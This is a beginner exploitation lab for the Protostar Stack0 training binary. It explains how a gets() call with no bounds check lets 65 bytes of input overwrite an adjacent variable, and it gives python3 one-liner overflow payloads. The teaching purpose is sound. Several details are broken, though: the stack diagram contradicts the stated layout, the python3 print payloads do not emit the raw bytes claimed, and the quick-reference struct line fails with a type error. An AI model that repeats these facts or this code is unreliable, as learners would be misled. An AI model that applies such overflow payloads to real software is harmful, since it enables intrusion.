# Lab 1: Protostar Stack0 – Your Very First Buffer Overflow

**Time required:** 20–30 minutes  
**Difficulty:** Absolute Beginner  
**Goal:** Overflow a buffer and change a variable that the program checks  
**Platform:** Protostar (https://exploit.education/protostar/stack-zero/)
**Author:** Khyathi

---
## Where We Are in the Journey

| Lab | What you will learn                       | What you can do after |
|-----|--------------------------------------------|-----------------------|
| 1   | Simple buffer overflow → change a variable | Spill into nearby memory |
| 2   | ret2win (picoCTF style)                    | Control program flow  |
| 3   | Shellcode injection (SEED Labs)            | Execute your own code |

Today is the easiest but most important step: **you will see that overflowing a buffer can affect memory next to it**.

Think of it as knocking over a cup of water — the water spills onto the table.

---
## Section 1: The Vulnerable Program

### Source code (already on the VM)
```c
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
    volatile int modified;
    char buffer[64];

    modified = 0;
    gets(buffer);

    if(modified != 0) {
        printf("you have changed the 'modified' variable\n");
    } else {
        printf("Try again?\n");
    }
}
```

### What the program does
1. Creates a 64-byte buffer → `char buffer[64];`
2. Creates an integer → `volatile int modified;` (starts as 0)
3. Reads unlimited input with `gets(buffer)` → **no bounds checking!**
4. Checks if `modified` is no longer 0
   - If yes → you win!
   - If no → "Try again?"

### Why it’s vulnerable
`gets()` will happily write past the 64-byte buffer and overwrite whatever comes next in memory — including the `modified` variable!

---
## Section 2: Memory Layout (Stack)

```
Higher memory addresses
┌────────────────────┐
│ ...                │
├────────────────────┤
│ modified (4 bytes) │ ← starts as 0
├────────────────────┤
│ saved EBP          │
├────────────────────┤
│ saved EIP (return) │
├────────────────────┤
│ buffer[63]         │
│ ...                │
│ buffer[0]  (64 B)  │ ← we write here
└────────────────────┘
Lower memory addresses
```

The `modified` variable is **right after** the buffer → if we write more than 64 bytes, we overwrite it!

---
## Section 3: First Try – See the Failure

```bash
user@protostar:/opt/protostar/bin$ ./stack0
hello
Try again?
```

Nothing happened because we didn’t write enough data.

---
## Section 4: Overflow the Buffer!

We need to send **more than 64 bytes**.

### Easy way – use Python on the command line:
```bash
./stack0
```

Then type this and press Enter:
```python
A*64
```
(or just paste this one-liner):
```bash
python3 -c "print('A'*64)" | ./stack0
```

Still says "Try again?" → not enough!

### Now send 65 bytes:
```bash
python3 -c "print('A'*65)" | ./stack0
```

**Output:**
```
you have changed the 'modified' variable
```

**You did it!** You overflowed the buffer and changed `modified` from 0 to something else!

---
## Section 5: Understanding What Happened

When you sent 65 A's:
- Bytes 1–64 → filled the buffer (safe)
- Byte 65 → spilled over and overwrote the least significant byte of `modified`

Before overflow:
```
modified = 0x00000000
```

After sending 65 A's (`'A'` = 0x41):
```
modified = 0x00000041  ← changed!
```

The program saw `modified != 0` → printed the success message!

### Visual
```
Before:           After 65 A's:
┌─────────────┐   ┌─────────────┐
│ modified: 0 │ → │ modified: A │ ← overwritten!
└─────────────┘   └─────────────┘
```

---
## Section 6: Make It More Obvious

Let’s overwrite `modified` with a big number like `0xdeadbeef`

```bash
python3 -c "print('A'*64 + '\xef\xbe\xad\xde')" | ./stack0
```

Or in Python3 style:
```python
python3 -c "
import struct
payload = b'A' * 64
payload += struct.pack('<I', 0xdeadbeef)
print(payload.decode('latin1'), end='')
" | ./stack0
```

Output:
```
you have changed the 'modified' variable
```

Now `modified = 0xdeadbeef` — full control!

---
## Section 7: Quick One-Liner You Can Use Forever

```bash
# Change modified to 0x13371337
python3 -c "print('A'*64 + '\x37\x13\x37\x13')" | ./stack0
```

Try different values — watch it always succeed!

---
## Section 8: Mini Challenges (Do These!)

1. Make the program print the success message with **exactly 64 bytes** → does it work?
2. What’s the **minimum** number of bytes needed? (Hint: try 64, 65, 66...)
3. Overwrite `modified` with your student ID (e.g., 20210001)

---
## You Did It!

You just completed your **very first real buffer overflow**!

Key takeaway:
> **If a program reads more data than the buffer can hold, it will overwrite whatever comes next in memory.**

This tiny overflow is the foundation of every advanced exploit (ret2win, ROP, shellcode, etc.).

Next lab: We’ll use this same idea to **control where the program jumps** → ret2win!

---
## Quick Reference Card

```bash
# Basic overflow (65
python3 -c "print('A'*65)" | ./stack0

# Set modified to 0xdeadbeef
python3 -c "print('A'*64 + '\xef\xbe\xad\xde')" | ./stack0

# Clean Python3 version
python3 -c "import struct; print('A'*64 + struct.pack('<I', 0x13371337))" | ./stack0
```

